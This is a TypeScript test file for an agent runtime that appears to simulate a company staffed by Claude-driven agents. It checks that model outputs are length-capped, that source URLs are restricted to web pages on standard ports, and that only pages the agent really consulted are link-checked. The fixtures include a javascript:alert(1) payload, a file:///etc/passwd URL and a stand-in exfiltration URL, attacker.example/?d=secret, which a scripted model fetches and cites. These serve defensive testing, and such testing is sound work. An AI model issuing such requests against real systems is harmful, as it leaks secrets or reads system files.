import type Anthropic from "@anthropic-ai/sdk";
import { describe, expect, it } from "vitest";
import { DEFAULT_SETTINGS, emptyState, replay, type Agent, type DomainEvent, type Task } from "@narthex/core";
import { AnthropicRuntime, apiKey, brief, Engine, makeLinkCheck, MemoryEventStore, SimulatedClock, type AgentRuntime, type WorkContext } from "../src/index.ts";

const START = Date.UTC(2026, 9, 19, 7);
const agent: Agent = { id: "m", name: "Margaux", role: "cofondateur", hiredAt: 0, status: "working", skill: { success: 0, failure: 0 }, autonomy: 1 };
const task: Task = { id: "t", agentId: "m", title: "Plan", why: "", kind: "internal", status: "running", createdAt: 0, scheduledAt: 0 };

/** A fake API that answers turn after turn with the given content blocks. */
function scripted(turns: unknown[][]) {
  let i = 0;
  const results: unknown[] = [];
  const client = {
    beta: {
      messages: {
        stream: (p: { messages: { role: string; content: unknown }[] }) => {
          const last = p.messages.at(-1);
          if (last?.role === "user" && Array.isArray(last.content)) results.push(...last.content);
          const content = turns[Math.min(i++, turns.length - 1)]!;
          const calls = content.some((b) => (b as { type: string }).type === "tool_use");
          return { finalMessage: async () => ({ stop_reason: calls ? "tool_use" : "end_turn", model: "claude-opus-5-5", usage: { input_tokens: 1, output_tokens: 1 }, content }) };
        },
      },
    },
  } as unknown as Anthropic;
  return { client, results };
}

function ctx(plans: unknown[] = []): WorkContext {
  return { state: emptyState(), agent, task, now: 0, signal: new AbortController().signal, progress() {}, plan: (f: unknown) => (plans.push(f), null), recruit: () => null, spend() {} } as unknown as WorkContext;
}

describe("revision: what a model returns is bounded", () => {
  it("refuses a company sheet longer than its 300 words", async () => {
    const { client, results } = scripted([[{ type: "tool_use", id: "u", name: "update_memory", input: { memory: "mot ".repeat(2000) } }], [{ type: "text", text: "Fait." }]]);
    const out = await new AnthropicRuntime({ client }).run(ctx());
    expect(out.memory).toBeUndefined();
    expect(results).toContainEqual(expect.objectContaining({ tool_use_id: "u", is_error: true }));
  });

  it("drops sources that are not web pages and caps their number", async () => {
    const sources = [{ title: "x", url: "javascript:alert(1)", checkedAt: "2026-10-19" }, { title: "f", url: "file:///etc/passwd", checkedAt: "2026-10-19" }, ...Array.from({ length: 80 }, (_, i) => ({ title: `s${i}`, url: `https://ex.fr/${i}`, checkedAt: "2026-10-19" }))];
    const { client } = scripted([[{ type: "tool_use", id: "p", name: "publish_deliverable", input: { title: "T", summary: "S", body: "B", sources } }], [{ type: "text", text: "Fait." }]]);
    const out = await new AnthropicRuntime({ client }).run(ctx());
    expect(out.deliverable!.sources.every((s) => s.url?.startsWith("https://"))).toBe(true);
    expect(out.deliverable!.sources.length).toBeLessThanOrEqual(40);
  });

  it("keeps planned titles and reasons short", async () => {
    const plans: { title: string; why: string }[] = [];
    const { client } = scripted([[{ type: "tool_use", id: "p", name: "plan_task", input: { title: "T".repeat(5000), why: "W".repeat(5000), kind: "internal", in_hours: 0, assignee: "self" } }], [{ type: "text", text: "Fait." }]]);
    await new AnthropicRuntime({ client }).run(ctx(plans));
    expect(plans[0]!.title.length).toBeLessThanOrEqual(200);
    expect(plans[0]!.why.length).toBeLessThanOrEqual(500);
  });

  it("remembers which pages it really consulted", async () => {
    const { client } = scripted([
      [
        { type: "server_tool_use", id: "s", name: "web_search", input: { query: "bougies" } },
        { type: "web_search_tool_result", tool_use_id: "s", content: [{ type: "web_search_result", url: "https://www.insee.fr/a", title: "INSEE" }] },
        { type: "text", text: "Fait." },
      ],
    ]);
    const out = await new AnthropicRuntime({ client }).run(ctx());
    expect(out.consulted).toEqual(["https://www.insee.fr/a"]);
  });

  it("does not count a page fetched on the model's word: only what the search engine returned", async () => {
    const { client } = scripted([
      [
        { type: "server_tool_use", id: "f", name: "web_fetch", input: { url: "https://attacker.example/?d=secret" } },
        { type: "web_fetch_tool_result", tool_use_id: "f", content: { type: "web_fetch_result", url: "https://attacker.example/?d=secret" } },
        { type: "text", text: "Fait." },
      ],
    ]);
    const out = await new AnthropicRuntime({ client }).run(ctx());
    expect(out.consulted).toEqual([]);
  });
});

describe("revision: nothing pretends to have left the company", () => {
  it("tells an agent on an external task that it can only prepare it", () => {
    const s = replay([
      { type: "company.founded", company: { id: "c", name: "L", idea: "I", founder: { name: "I" }, foundedAt: START, stage: "research", paused: false }, settings: DEFAULT_SETTINGS },
    ] as DomainEvent[]);
    const text = brief({ state: s, agent, task: { ...task, kind: "external", title: "Envoyer les e-mails" }, now: START } as WorkContext);
    expect(text).not.toContain("you can act");
    expect(text).toMatch(/no tool to act outside/);
  });
});

describe("revision: only pages the agent read are checked, on standard ports", () => {
  it("never calls a URL the model made up, whatever it cites", async () => {
    const store = new MemoryEventStore();
    for (const e of [
      { type: "company.founded", company: { id: "c", name: "L", idea: "I", founder: { name: "I" }, foundedAt: START, stage: "research", paused: false }, settings: DEFAULT_SETTINGS },
      { type: "agent.hired", reason: "", agent: { ...agent, id: "l", name: "Léa", role: "recherche", status: "idle" } },
    ] as DomainEvent[])
      store.append("c", e, START);
    const asked: string[] = [];
    const runtime: AgentRuntime = {
      name: "anthropic",
      firstLook: async () => { throw new Error("no"); },
      run: async () => ({
        post: "Fait.",
        consulted: ["https://www.insee.fr/a"],
        deliverable: { title: "T", summary: "", body: "", sources: [{ title: "INSEE", url: "https://www.insee.fr/a" }, { title: "Piège", url: "https://attacker.example/?d=secret" }] },
      }),
    };
    const e = new Engine({ store, runtime, clock: new SimulatedClock(START), checkLink: async (u) => (asked.push(u), true) });
    e.tick();
    await e.idle();
    expect(asked.every((u) => u === "https://www.insee.fr/a")).toBe(true);
    expect(asked.length).toBeGreaterThan(0);
  });

  it("refuses non-standard ports", async () => {
    const check = makeLinkCheck({ lookup: async () => ["93.184.215.14"], fetch: async () => ({ status: 200 }) });
    expect(await check("http://93.184.215.14:6379/", AbortSignal.timeout(1000))).toBe(false);
    expect(await check("https://93.184.215.14/", AbortSignal.timeout(1000))).toBe(true);
  });
});

describe("revision: the key the player saved is the one billed", () => {
  it("prefers the key saved for Narthex over an exported one", () => {
    expect(apiKey({ anthropicApiKey: "sk-ant-saved" }, { ANTHROPIC_API_KEY: "sk-ant-env" })).toBe("sk-ant-saved");
    expect(apiKey({}, { ANTHROPIC_API_KEY: "sk-ant-env" })).toBe("sk-ant-env");
  });
});
